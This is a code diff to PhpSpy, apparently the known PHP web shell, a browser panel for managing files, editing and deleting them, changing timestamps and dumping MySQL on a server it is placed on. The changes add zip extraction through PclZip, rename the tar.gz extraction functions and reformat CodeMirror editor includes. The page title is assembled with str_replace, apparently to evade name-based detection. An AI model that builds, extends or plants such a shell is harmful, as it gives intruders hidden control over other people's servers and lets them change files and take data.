@@ -31,6 +31,7 @@ define('IS_COM', class_exists('COM') ? 1 : 0);
 define('IS_GPC', get_magic_quotes_gpc());
 $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
+define('SUPPORT_ZIP', file_exists(SA_ROOT . 'pclzip.lib.php') ? 1 : 0);
 @set_time_limit(0);
 
 foreach (array('_GET', '_POST') as $_request) {
@@ -185,11 +186,11 @@ if ($doing == 'mysqldown') {
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 	<title><?php echo str_replace('.', '', 'P.h.p.S.p.y'); ?></title>
-	
+
 	<!-- CodeMirror CSS -->
 	<link rel="stylesheet" href="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
 	<link rel="stylesheet" href="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/theme/monokai.min.css">
-	
+
 	<style type="text/css">
 		body,
 		td {
@@ -495,7 +496,7 @@ if ($doing == 'mysqldown') {
 					}
 
 					// 解压tar.gz文件
-					elseif ($doing == 'extracttargz') {
+					elseif ($doing == 'extractfile') {
 						if ($thefile) {
 							// 处理路径 - 如果是相对路径，则与当前目录结合
 							if (IS_WIN) {
@@ -513,7 +514,7 @@ if ($doing == 'mysqldown') {
 									$filepath = $nowpath . $thefile;
 								}
 							}
-							
+
 							// 检查文件是否存在
 							if (!file_exists($filepath)) {
 								m('File does not exist: ' . $filepath);
@@ -521,14 +522,14 @@ if ($doing == 'mysqldown') {
 							// 检查是否是tar.gz文件
 							else {
 								$filename = basename($filepath);
-								if (!preg_match('/\.tar\.gz$|\.tgz$/', $filename)) {
-									m('Please select a tar.gz file');
+								if (!preg_match('/\.(tar\.gz|tgz|zip)$/i', $filename)) {
+									m('Please select a tar.gz or zip file');
 								} else {
 									// 直接解压到当前目录
-									if (extractTarGz($filepath, $nowpath)) {
-										m('Extract tar.gz file success');
+									if (extractfile($filepath, $nowpath)) {
+										m('Extract compressed file success');
 									} else {
-										m('Extract tar.gz file failed. Please check if zlib extension is enabled.');
+										m('Extract compressed file failed. Please check if zlib extension is enabled.');
 									}
 								}
 							}
@@ -617,14 +618,14 @@ if ($doing == 'mysqldown') {
 							$('rename').submit();
 						}
 
-						function extracttargz(targzfile) {
-							if (!targzfile) {
-								alert('Please select a tar.gz file to extract.');
+						function extractfile(compressedfile) {
+							if (!compressedfile) {
+								alert('Please select a compressed file (.tar.gz, .tgz or .zip) to extract.');
 								return;
 							}
-							if (confirm('Are you sure will extract ' + targzfile + ' to current directory?')) {
-								$('filelist').doing.value = 'extracttargz';
-								$('filelist').thefile.value = targzfile;
+							if (confirm('Are you sure will extract ' + compressedfile + ' to current directory?')) {
+								$('filelist').doing.value = 'extractfile';
+								$('filelist').thefile.value = compressedfile;
 								$('filelist').submit();
 							}
 						}
@@ -745,7 +746,6 @@ if ($doing == 'mysqldown') {
 							p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
 							p('<td nowrap><a href="javascript:dofile(\'deldir\',\'' . $dirdb['server_link'] . '\',\'Are you sure will delete ' . $dirdb['filename'] . '? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\'' . $dirdb['server_link'] . '\');">Rename</a></td>');
 							if ($dirdb['filename'] == '.') {
-		
 							}
 							p('</tr>');
 							$dir_i++;
@@ -783,8 +783,9 @@ if ($doing == 'mysqldown') {
 							p('<a href="javascript:opfile(\'editfile\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
 							p('<a href="javascript:rename(\'' . $filedb['server_link'] . '\');">Rename</a> | ');
 							p('<a href="javascript:opfile(\'newtime\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Time</a>');
-							if (str_ends_with($filedb['filename'], '.gz') || str_ends_with($filedb['filename'], '.tgz')) {
-								p('<a href="javascript:dofile(\'extracttargz\',\'' . $filedb['server_link'] . '\',\'Are you sure will extract ' . $filedb['filename'] . ' to current directory?\')"> | Extract</a>');
+							if (str_ends_with($filedb['filename'], '.gz') || str_ends_with($filedb['filename'], '.tgz') || (str_ends_with($filedb['filename'], '.zip') && SUPPORT_ZIP)) {
+								p(' | ');
+								p('<a href="javascript:dofile(\'extractfile\',\'' . $filedb['server_link'] . '\',\'Are you sure will extract ' . $filedb['filename'] . ' to current directory?\')">Extract</a>');
 							}
 							p('</td></tr>');
 							$file_i++;
@@ -1362,7 +1363,7 @@ if ($doing == 'mysqldown') {
 					makeinput(array('title' => 'Current File (import new file name and new file)', 'name' => 'editfilename', 'value' => $opfile, 'newline' => 1));
 					maketext(array('title' => 'File Content', 'name' => 'filecontent', 'value' => $contents));
 					formfooter();
-					
+
 					// 添加专门针对编辑文件的 CodeMirror 初始化脚本
 					echo '<script>
 						// 等待页面和 CodeMirror 加载完成
@@ -1480,7 +1481,7 @@ if ($doing == 'mysqldown') {
 							setTimeout(initEditor, 100);
 						}
 					</script>';
-					
+
 					// Initialize CodeMirror for edit file page
 					echo '<script>
 						// Wait for DOM to be ready
@@ -1716,28 +1717,28 @@ if ($doing == 'mysqldown') {
 									ob_end_flush(); ?></span>
 		Copyright (C) 2004-2008 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
 	</div>
-	
-<!-- CodeMirror JavaScript -->
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
-<!-- PHP 模式需要的依赖 -->
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.js"></script>
-<!-- 其他语言模式 -->
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/sql/sql.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/python/python.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/perl/perl.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/shell/shell.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/batch/batch.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/apache/apache.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/yaml/yaml.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/markdown/markdown.min.js"></script>
-<!-- CodeMirror 插件 -->
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/addon/edit/closebrackets.min.js"></script>
-<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/addon/edit/matchbrackets.min.js"></script>
+
+	<!-- CodeMirror JavaScript -->
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
+	<!-- PHP 模式需要的依赖 -->
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.js"></script>
+	<!-- 其他语言模式 -->
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/sql/sql.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/python/python.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/perl/perl.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/shell/shell.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/batch/batch.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/apache/apache.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/yaml/yaml.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/mode/markdown/markdown.min.js"></script>
+	<!-- CodeMirror 插件 -->
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/addon/edit/closebrackets.min.js"></script>
+	<script src="https://cdn.jsdmirror.com/ajax/libs/codemirror/5.65.2/addon/edit/matchbrackets.min.js"></script>
 
 </body>
 
@@ -2426,10 +2427,10 @@ function maketext($arg = array())
 	!$arg['cols'] && $arg['cols'] = 100;
 	!$arg['rows'] && $arg['rows'] = 25;
 	$arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
-	
+
 	// Add CodeMirror class for filecontent textarea
 	$cssClass = ($arg['name'] == 'filecontent') ? 'area codemirror-textarea' : 'area';
-	
+
 	p("<p>$arg[title]<textarea class=\"$cssClass\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
 }
 
@@ -2453,8 +2454,7 @@ function pr($a)
 	echo '</pre>';
 }
 
-// 解压tar.gz文件函数
-function extractTarGz($file, $extractPath)
+function extractfile($file, $extractPath)
 {
 	if (!file_exists($file)) {
 		return false;
@@ -2467,18 +2467,32 @@ function extractTarGz($file, $extractPath)
 		}
 	}
 
+	if (preg_match('/\.(tar\.gz|tgz|zip)$/i', $file)) {
+		return realextract($file, $extractPath);
+	} else {
+		return false; // 不支持的格式
+	}
+}
+
+// 解压tar.gz文件函数
+function realextract($file, $extractPath)
+{
+
 	// 检查是否有zlib扩展支持
 	if (!function_exists('gzopen')) {
 		return false;
 	}
 
+
 	// 尝试使用PclZip如果可用（更好的错误处理）
-	if (file_exists('pclzip.lib.php')) {
+	if (SUPPORT_ZIP) {
 		require_once('pclzip.lib.php');
 		$archive = new PclZip($file);
 		if ($archive->extract(PCLZIP_OPT_PATH, $extractPath)) {
 			return true;
 		}
+	} else if (str_ends_with(strtolower($file), '.zip')) {
+		return false; // PclZip不可用，无法处理zip文件
 	}
 
 	// 打开tar.gz文件
@@ -2556,8 +2570,9 @@ function extractTarGz($file, $extractPath)
  * @param string $haystack 要检查的字符串
  * @param string $needle 要检查的后缀
  */
-function str_ends_with($haystack, $needle) {
-    return substr($haystack, -strlen($needle)) === $needle;
+function str_ends_with($haystack, $needle)
+{
+	return substr($haystack, -strlen($needle)) === $needle;
 }
 
 ?>
